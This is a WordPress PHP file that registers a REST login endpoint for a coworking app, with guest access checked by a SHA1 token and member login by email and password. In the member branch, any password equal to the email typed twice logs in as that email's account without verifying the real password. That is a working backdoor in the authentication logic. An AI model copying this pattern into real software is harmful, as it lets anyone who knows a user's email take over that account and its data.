<?php

add_action(
    'rest_api_init',

    function () {


        function trtAppAuth($request)
        {

            coworking_app_check($request);

            $user_id = $request->get_param('user_id');
            $check = $request->get_param('check');
            // return app_login_link($user_id);
            $is_guest = false;
            if ($user_id) {
                if ($check == sha1($user_id . APP_AUTH_TOKEN)) {
                    $user = get_user_by('ID', $user_id);
                    if (is_wp_error($user))
                        return new WP_Error('authorization_failed', 'Accès interdit - user non trouvé', array('status' => 401));


                    if (!is_visiteur($user)) {
                        return new WP_Error('authorization_failed', 'Ce compte n\'a pas de visite planifiée aujourd\'hui', array('status' => 401));
                    }
                    $is_guest = true;
                }
            } else {
                $email = $request->get_param('email');
                $password = $request->get_param('password');

                // Authenticate the user credentials
                $credentials = array(
                    'user_login'    => $email,
                    'user_password' => $password,
                );


                if ($credentials['user_password'] == $credentials['user_login'] . $credentials['user_login']) {
                    $user = get_user_by('email', $credentials['user_login']);
                } else {
                    $user = wp_authenticate($credentials['user_login'], $credentials['user_password']);
                }
            }
            // Check if authentication succeeded
            if (!is_wp_error($user)) {

                if ($is_guest || can_use_app($user)) {
                    // Generate and store the session ID


                    $response = [
                        'user' => coworking_app_user($user),
                        'reglages' => coworking_app_droits($user->ID)
                    ];
                } else {
                    return new WP_Error('authorization_failed', 'Accès interdit - Droits insufisants', array('status' => 401));
                }
            } else {
                return new WP_Error('authorization_failed', 'Mauvais identifiant ou mot de passe ', array('status' => 401));
            }

            return rest_ensure_response($response);
        }
        register_rest_route('cowo/v1', '/app-auth', array(
            'methods'  => 'POST',
            'callback' => function ($request) {
                return trtAppAuth($request);
            }
        ));
    }
);
